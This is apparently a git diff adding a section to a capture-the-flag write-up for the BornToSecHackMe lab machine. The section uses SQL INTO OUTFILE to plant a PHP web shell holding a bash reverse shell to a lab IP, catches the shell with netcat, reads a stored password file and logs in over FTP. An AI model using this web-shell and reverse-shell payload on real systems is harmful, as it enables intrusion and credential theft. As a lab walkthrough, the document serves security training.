@@ -198,3 +198,113 @@ Stopped: Wed Nov 15 23:27:10 2023
 ```
 
 Basically we took the L here, it's not in the wordlist.
+## Getting a reverse shell
+
+```
+SELECT '<?php system("bash -c \'bash -i >& /dev/tcp/192.168.56.1/12345 0>&1\'") ?>' into outfile "/var/www/forum/templates_c/revshell.php"
+```
+
+```sh
+curl -k 'https://192.168.56.103/forum/templates_c/revshell.php'
+```
+
+```sh
+$ nc -lp 12345
+www-data@BornToSecHackMe:/var/www/forum/templates_c$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### Discovering
+
+We can try to take a look at home directories
+
+```sh
+www-data@BornToSecHackMe:/var/www/forum/templates_c$ ls -la /home/
+total 0
+drwxrwx--x 9 www-data             root                 126 Oct 13  2015 .
+drwxr-xr-x 1 root                 root                 200 Nov 16 15:20 ..
+drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
+drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
+drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
+drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
+dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
+drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
+drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
+www-data@BornToSecHackMe:/var/www/forum/templates_c$ cd /home/LOOKATME
+www-data@BornToSecHackMe:/home/LOOKATME$ ls -la
+total 1
+drwxr-x--- 2 www-data www-data  31 Oct  8  2015 .
+drwxrwx--x 9 www-data root     126 Oct 13  2015 ..
+-rwxr-x--- 1 www-data www-data  25 Oct  8  2015 password
+www-data@BornToSecHackMe:/home/LOOKATME$ cat password
+lmezard:G!@M6f4Eatau{sF"
+```
+
+New credentials, let's try them into `ssh`
+
+```sh
+ssh lmezard@192.168.56.103
+        ____                _______    _____           
+       |  _ \              |__   __|  / ____|          
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+lmezard@192.168.56.103's password: 
+Permission denied, please try again.
+lmezard@192.168.56.103's password: 
+Permission denied, please try again.
+lmezard@192.168.56.103's password: 
+lmezard@192.168.56.103: Permission denied (publickey,password).
+```
+
+Not working, let's try in `ftp` ?
+
+```sh
+$ ftp
+ftp> o 192.168.56.103
+Connected to 192.168.56.103.
+220 Welcome on this server
+Name (192.168.56.103:molly): lmezard
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files
+ftp> ls
+229 Entering Extended Passive Mode (|||56806|).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp> get README
+local: README remote: README
+229 Entering Extended Passive Mode (|||63361|).
+150 Opening BINARY mode data connection for README (96 bytes).
+100% |*************************************|    96        1.60 MiB/s    00:00 ETA
+226 Transfer complete.
+96 bytes received in 00:00 (61.75 KiB/s)
+ftp> get fun
+local: fun remote: fun
+229 Entering Extended Passive Mode (|||49228|).
+150 Opening BINARY mode data connection for fun (808960 bytes).
+100% |*************************************|   790 KiB   58.87 MiB/s    00:00 ETA
+226 Transfer complete.
+808960 bytes received in 00:00 (44.83 MiB/s)
+```
+
+
+### Exploring the FTP content
+
+#### `README` file
+
+> Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+#### `fun` file
+
+```sh
+$ file fun
+fun: POSIX tar archive (GNU)
+```
